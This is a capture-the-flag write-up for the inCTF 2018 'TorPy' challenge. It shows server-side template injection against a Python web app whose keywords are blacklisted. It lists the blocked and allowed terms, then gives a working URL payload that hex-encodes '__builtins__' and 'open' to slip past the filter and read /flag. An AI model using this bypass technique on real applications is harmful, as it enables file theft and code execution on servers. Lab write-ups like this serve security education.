# TorPy

![alt text](https://raw.githubusercontent.com/flawwan/CTF-Writeups/master/inCTF2018/images/13.png)

Only 17/306=5% of the teams solved this one. We were the second team to solve this one.

## Reconnaissance

![alt text](https://raw.githubusercontent.com/flawwan/CTF-Writeups/master/inCTF2018/images/14.png)

Okay we see a interesting name in a comment.

![alt text](https://raw.githubusercontent.com/flawwan/CTF-Writeups/master/inCTF2018/images/15.png)

Okay we can inject stuff. This is probably a template injection.

![alt text](https://raw.githubusercontent.com/flawwan/CTF-Writeups/master/inCTF2018/images/17.png)

![alt text](https://raw.githubusercontent.com/flawwan/CTF-Writeups/master/inCTF2018/images/18.png)

## Blacklisted
```python
__class__
subprocesses
os
import
builtins
eval
file
getattr
[]
for
if
open
_tt_append
```
## Whitelisted, probably useful
```python
locals
;
globals
while
dir
==
bool
__getitem__
base
```

### Attack

Our goal is to run the below code. But we cant use [] or builtins:
```python
globals()["__builtins__"].open("/flag").read()
```

The following python methods were the key to solving this challenge. The difference between this and the file upload challenge is that in this one, we can't use [].

* `__getitem__`
* `bytes.fromhex`
* `globals()`

As we could convert stuff from hex to ascii we can type anything we want basically.

```
5f5f6275696c74696e735f5f => __builtins__
6f70656e => open
```

And now we just create our payload:
```python
?name={{globals().__getitem__(bytes.fromhex(%275f5f6275696c74696e735f5f%27).decode(%27utf-8%27)).__getitem__(bytes.fromhex(%276f70656e%27).decode(%27utf-8%27))(%22/flag%22,%20%22r%22).read()}}
```

![alt text](https://raw.githubusercontent.com/flawwan/CTF-Writeups/master/inCTF2018/images/16.png)
